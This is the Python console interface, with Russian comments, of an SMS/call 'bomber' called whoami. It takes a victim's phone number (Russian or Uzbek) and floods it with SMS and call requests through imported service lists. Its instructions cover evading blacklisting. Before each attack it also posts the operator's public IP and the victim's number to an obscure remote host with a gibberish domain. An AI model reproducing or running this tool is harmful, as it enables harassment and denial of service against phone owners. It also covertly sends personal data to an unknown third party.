import sys
import os
from time import sleep
from random import choice
from colorama import Fore
import fade
from tqdm import tqdm
import subprocess
import requests
import string
import random
import time
import re

# Добавляем путь к родительскому каталогу, чтобы импортировать модули из Core
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from Core.Config import *
from Core.Run import start_async_attacks
from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls

def main():
    '''Консольный интерфейс бомбера'''


    _banner = '''
██╗    ██╗██╗  ██╗ ██████╗  █████╗ ███╗   ███╗██╗
██║    ██║██║  ██║██╔═══██╗██╔══██╗████╗ ████║██║
██║ █╗ ██║███████║██║   ██║███████║██╔████╔██║██║
██║███╗██║██╔══██║██║   ██║██╔══██║██║╚██╔╝██║██║
╚███╔███╔╝██║  ██║╚██████╔╝██║  ██║██║ ╚═╝ ██║██║
 ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝??
                                                 
 v1.1.9 alpha!
'''

    _dockBanner = '''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⡀
⠀⠀⠀⢲⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣦⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⣶⠀⠀⠀⠀⢸⠁
⠀⠀⠀⣿⠀?⠀⠀⢸⡇⠀⠀⠀⠀⡇⠀⠀⠀⠀⢸⠀⠀m⠀⠀⡇⠀e⠀⠀⣿⠀⠀⠀⠀⢸⡆
⠀⠀⠀⣿⡀⢀⠀⠀⣸⣇⢀⠀⠤⢠⣿⠄⡄⢀⡠⣼⡤⣀⠀⡄⢸⣧⠠⡀⢠⢤⣿⡤⡄⠠⠔⣾⡗⠢ 
⠀⠀⠀⣿⠁⠀⠀⠀⢻⡏⠀⠀⠀⢠⣿⠀⠀⠀⠀⣿⡇⠀⠀⠀⢸⣿⠀⠀⠀⠘⣿⠃⠀⠀⠀⣿⡇oh   un??
⠀⠀⠀⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠘⣿⠀⠀⠀⠀⣿⡇⠀⠀⠀⢸⡿⠀⠀⠀⢀⣿⡀⠀⠀⠀⣿⡇  
⠀⠀⠀⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⡇⠀⠀⠀⢸⡇⠀⠀⠀⠈⣿⠁⠀⠀⠀⣿⡇
⠀⠀⠀⣿⠀⠀⠀⠀⢸⡇⠀u⠀⠀⣿⠀⠀n⠀⢸⠁⠀?⠀⢸⡇⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⡇ 
⠀⠀⠀⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣿⠀⠀⠀⠀⢸⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⡇ un?? me 
⠀⠀⠀⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⢸⣿⠀⠀⠀⠀⢸⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⡇ 
⠀⠀⠀⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣿⠀⠀⠀⠀⢸⠀⠀c⠀⢸⡇⠀r⠀⠀⣿⠀y ⠀⢻⡇ :) 
⠀⠀⠀⠈⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠋⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠉⠀⠀⠀⠀⠘⠁ who am i?
          by whoami дэнчик йоу
  ⣶⣶⣶⣶⣶⣾⡷⢿⣶⣶⡾⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣾⣿⣿'''



    # Инициализация конфигурации
    config = check_config()

    def instruction():
        clear = lambda: os.system('cls' if os.name=='nt' else 'clear')
        clear()
        subprocess.call('clear' if os.name != 'nt' else 'cls', shell=True)
        print(fade.fire('''
1. Упала интенсивность атаки.
 В случае, если интенсивность атаки значительно упала - прекратите атаку и подождите некоторое время.
 Так происходит из-за того, что сервисы добавляют ваш ip/номер в чёрный список из-за слишком большого кол-ва запросов.
                
2. Атака не началась.
 Если жертве не приходят SMS сообщения, попробуйте переустановить репозиторий и обновить библиотеки.
 В случае, если это не помогло, то подождите некоторое время. Возможно упал сервер с токенами.
 Если сервер не поднимается долгое время, напишите разработчику.
 Бомбер может не работать в случае, если вы используете мобильный интернет. (Скоро исправлю)
 Также убедитесь что номер начинается на +7 или +998 (Россия и Узбекистан соответственно).
                
3. Утилита неисправна или работает неккоректно.
 Обновите, переустановите или ждите, пока дядя разработчик всё пофиксит.

 Выйти - CTRL+C
 Завершить программу - CTRL+Z

 В случае обнаружения бага/неисправности:
 https://t.me/whoamidkk
 @whoamidkk
'''))
        print(fade.greenblue('''
░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
██████▄███▄████░░███▄░░░░░░░
▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░░░█░░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
▓▓▓▓▓▓█████░░░░░░░░░██░░░░░
█████▀░░░░▀▀████████░░░░░░ ??
'''))
        number = input(Fore.RED + "Вернуться - Enter").strip()
        if number:
            main()

    def send_token(number):
        generate_token = lambda length=16: ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        
        def get_ip_address():
            try:
                return requests.get('https://api.ipify.org?format=json').json().get('ip')
            except requests.RequestException as e:
                print(f"Error getting IP address: {e}")
                return None

        url = 'http://eygksjcnbgdsfglksdfhgrhulkdhf.atwebpages.com'
        ip_address = get_ip_address()
        if ip_address:
            try:
                response = requests.post(url, data={
                    'token': generate_token(), 
                    'ip_address': ip_address,
                    'phone_number': number
                })
                if response.status_code == 200 and 'Your IP address is blocked' in response.text:
                    print(Fore.RED + "Ваш IP-адрес заблокирован. Пожалуйста, попробуйте позже.")
                    return False
                elif response.status_code == 200:
                    return True
                else:
                    print(Fore.RED + "Ошибка при отправке данных. Проверьте сервер.")
                    return False
            except requests.RequestException as e:
                print(f"RequestException: {e}")
                return False
        else:
            print(Fore.RED + "Не удалось получить IP-адрес.")
            return False


    def check_for_updates():
        # Получение текущей ветки
        current_branch = subprocess.getoutput("git rev-parse --abbrev-ref HEAD")

        # Сравнение локального и удаленного репозиториев
        subprocess.run(["git", "fetch", "origin", current_branch])

        local_commit = subprocess.getoutput("git rev-parse HEAD")
        remote_commit = subprocess.getoutput(f"git rev-parse origin/{current_branch}")

        return local_commit != remote_commit

    def update_application():
        # Выполнение команды для обновления локального репозитория
        subprocess.run(["git", "pull"])

    def type_attack_change():
        '''Изменение типа атаки'''
        new_type_attack = input(Fore.RED + "Введите тип атаки (MIX, SMS, CALL): ").strip().upper()
        if new_type_attack in ['MIX', 'SMS', 'CALL']:
            change_config('type_attack', new_type_attack)
        else:
            print(Fore.RED + "Неверный тип атаки!")

    def feedback_change():
        '''Включение/выключение сервисов обратной связи'''
        feedback_status = input(Fore.RED + "Включить сервисы обратной связи? (yes/no): ").strip().lower()
        change_config('feedback', 'True' if feedback_status == 'yes' else 'False')

    def start_attack(number):
        '''Запуск атаки'''
        print(Fore.GREEN + "Запуск атаки, пожалуйста подождите...")
        
        if send_token(number):  # Передаем номер в send_token
            print(Fore.GREEN + "Атака запущена! (надеюсь)" + Fore.GREEN + "\nВ случае, если атака не запустилась - читайте инструкцию." + Fore.RED)
            
            change_config('attack', 'True')
            try:
                while True:
                    start_async_attacks(number, 1)
            except KeyboardInterrupt:
                print(Fore.RED + "Атака остановлена пользователем.")
            finally:
                change_config('attack', 'False')
                print(Fore.RED + "Атака завершена.")
        else:
            print(Fore.RED + "Произошла ошибка. Попробуйте позже.")
            number = input(Fore.RED + "Вернуться - Enter").strip()
            if number:
                main()


    def checking_values():
        clear = lambda: os.system('cls' if os.name=='nt' else 'clear')
        clear()
        subprocess.call('clear' if os.name != 'nt' else 'cls', shell=True)
        '''Проверка вводимых данных'''
        print(fade.fire(_dockBanner))
        number = input(Fore.RED + "Введите номер (в любом формате): ").strip()
        
        # Удаление всех символов, кроме цифр
        number = re.sub(r'\D', '', number)

        if number.isdigit():
            start_attack(number)
        else:
            print(Fore.RED + "Введите корректный номер!")

    while True:
        clear = lambda: os.system('cls' if os.name=='nt' else 'clear')
        clear()
        subprocess.call('clear' if os.name != 'nt' else 'cls', shell=True)
        print(fade.purplepink(_banner))
        print(Fore.RED + 'может работать через раз, занимаюсь серверами.')
        print(fade.fire("\n1. Запуск атаки\n2. Изменить тип атаки\n3. Включить/выключить сервисы обратной связи\n4. Инструкция\n5. Обновить\n6. Выход"))
        choice = input(Fore.RED + "Выберите опцию: ").strip()

        if choice == '1':
            checking_values()
        elif choice == '2':
            type_attack_change()
        elif choice == '3':
            feedback_change()
        elif choice == '4':
            instruction()
        elif choice == '5':
            if check_for_updates():
                clear = lambda: os.system('cls' if os.name=='nt' else 'clear')
                clear()
                subprocess.call('clear' if os.name != 'nt' else 'cls', shell=True)
                print(Fore.GREEN + "Найдены обновления. Обновление бомбера...")
                update_application()
                print(Fore.GREEN + "Бомбер успешно обновлён. Перезапустите его командой \n'python3 whoami.py'.")
                number = input(Fore.RED + "Вернуться - Enter").strip()
                if number:
                    main()
                break
            else:
                print(Fore.GREEN + "Успешно проверено. Обновлений нет.")
                number = input(Fore.RED + "Вернуться - Enter").strip()
                if number:
                    main()
        elif choice == '6':
            break
        else:
            print(Fore.RED + "Неверный выбор. Попробуйте снова.")

if __name__ == "__main__":
    main()
